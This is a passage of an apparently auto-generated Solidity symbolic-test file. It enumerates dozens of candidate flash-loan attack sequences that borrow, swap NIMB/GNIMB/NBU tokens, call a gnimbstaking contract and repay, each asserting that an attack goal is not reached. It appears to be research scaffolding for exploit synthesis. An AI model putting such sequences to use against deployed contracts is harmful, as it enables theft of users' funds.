        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4565(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4566(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4567(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4568(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4569(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4570(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4571(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4572(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4573(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4574(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4575(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4576(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4577(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4578(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4579(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4580(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4581(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4582(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4583(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4584(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4585(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4586(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4587(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4588(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4589(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4590(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4591(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4592(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4593(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4594(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4595(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4596(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4597(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4598(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4599(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4600(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4601(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4602(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4603(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4604(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4605(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4606(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4607(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4608(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4609(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4610(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
